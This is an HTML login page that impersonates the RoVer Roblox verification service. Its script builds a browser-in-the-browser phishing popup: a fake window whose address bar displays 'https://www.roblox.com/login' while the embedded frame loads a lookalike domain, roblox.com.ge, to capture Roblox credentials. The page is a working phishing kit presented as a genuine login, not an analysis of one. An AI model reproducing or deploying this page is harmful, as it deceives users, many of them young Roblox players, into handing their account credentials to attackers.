<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RoVer â€“ Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --pink: #ff4dd2;
      --purple: #9b4dff;
      --bg-dark: #0e0e10;
      --panel-dark: #18181b;
      --text-light: #f5f5f5;
      --gray: #aaa;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at top left, var(--purple), var(--pink));
      background-attachment: fixed;
      color: var(--text-light);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    /* NAVBAR */
    nav {
      background: rgba(0, 0, 0, 0.45);
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 24px;
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo img {
      height: 36px;
    }

    .nav-links {
      display: flex;
      align-items: center;
      gap: 18px;
    }

    .nav-links a, .btn {
      color: var(--text-light);
      text-decoration: none;
      font-weight: 500;
      transition: opacity 0.2s ease;
    }

    .nav-links a:hover, .btn:hover {
      opacity: 0.8;
    }

    /* MAIN PANEL */
    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 40px 16px;
    }

    .panel {
      background: var(--panel-dark);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      max-width: 400px;
      width: 100%;
      padding: 36px 28px;
      text-align: center;
      animation: fadeIn 0.6s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .panel h1 {
      font-size: 26px;
      margin-bottom: 10px;
      font-weight: 700;
    }

    .panel p {
      color: var(--gray);
      font-size: 15px;
      margin-bottom: 24px;
    }

    .login-btn {
      background: linear-gradient(90deg, var(--pink), var(--purple));
      color: #fff;
      border: none;
      padding: 14px 18px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      width: 100%;
      cursor: pointer;
      transition: transform 0.2s ease, opacity 0.2s ease;
    }

    .login-btn:hover {
      transform: translateY(-2px);
      opacity: 0.9;
    }

    /* FOOTER */
    footer {
      text-align: center;
      padding: 20px;
      font-size: 14px;
      color: var(--gray);
      background: rgba(0, 0, 0, 0.3);
    }

    /* FAKE POPUP + OVERLAY (unchanged) */
    .fake-popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 700px;
      height: 600px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      overflow: hidden;
      z-index: 1000;
      border: 1px solid #ccc;
    }

    .window-bar {
      background: #e0e0e0;
      height: 36px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 12px;
      font-size: 14px;
      font-weight: bold;
      color: #333;
      border-bottom: 1px solid #ccc;
    }

    .popup-close {
      font-size: 20px;
      cursor: pointer;
      color: #666;
    }

    .popup-close:hover { color: red; }

    .url-bar {
      background: #f4f4f4;
      border: 1px solid #ccc;
      margin: 10px;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 13px;
      font-family: monospace;
      color: #333;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
    }

    .popup-iframe {
      width: 100%;
      height: calc(100% - 76px);
      border: none;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.65);
      z-index: 999;
    }

    /* RESPONSIVE */
    @media (max-width: 600px) {
      .panel {
        padding: 28px 20px;
      }
      .panel h1 {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>
  <nav>
    <div class="logo">
      <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
    </div>
    <div class="nav-links">
      <a href="#">Help</a>
      <a href="#">Team Members</a>
      <a href="#">RoVer Plus</a>
    </div>
  </nav>

  <main>
    <div class="panel">
      <h1>Link Roblox Account</h1>
      <p>Youâ€™ll be redirected to Roblox for verification.</p>
      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
    </div>
  </main>

  <footer>
    Â© 2025 RoVer. All rights reserved.
  </footer>

  <!-- Overlay + Popup -->
  <div class="overlay" id="overlay"></div>

  <div class="fake-popup" id="fakePopup">
    <div class="window-bar">
      ROBLOX
      <div class="popup-close" id="popupClose">&times;</div>
    </div>
    <div class="url-bar" id="urlDisplay">ðŸ”’ https://www.roblox.com/login</div>
    <iframe class="popup-iframe" id="popupIframe"></iframe>
  </div>

  <script>
    const loginBtn = document.getElementById("loginBtn");
    const fakePopup = document.getElementById("fakePopup");
    const popupClose = document.getElementById("popupClose");
    const overlay = document.getElementById("overlay");
    const iframe = document.getElementById("popupIframe");
    const urlDisplay = document.getElementById("urlDisplay");

    loginBtn.addEventListener("click", () => {
      const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
      const fakeUrl = "https://www.roblox.com/login";

      fakePopup.style.display = "block";
      overlay.style.display = "block";
      iframe.src = "";
      urlDisplay.textContent = fakeUrl;

      setTimeout(() => { iframe.src = realUrl; }, 50);
    });

    popupClose.addEventListener("click", () => {
      fakePopup.style.display = "none";
      overlay.style.display = "none";
      iframe.src = "";
    });
  </script>
</body>
</html>
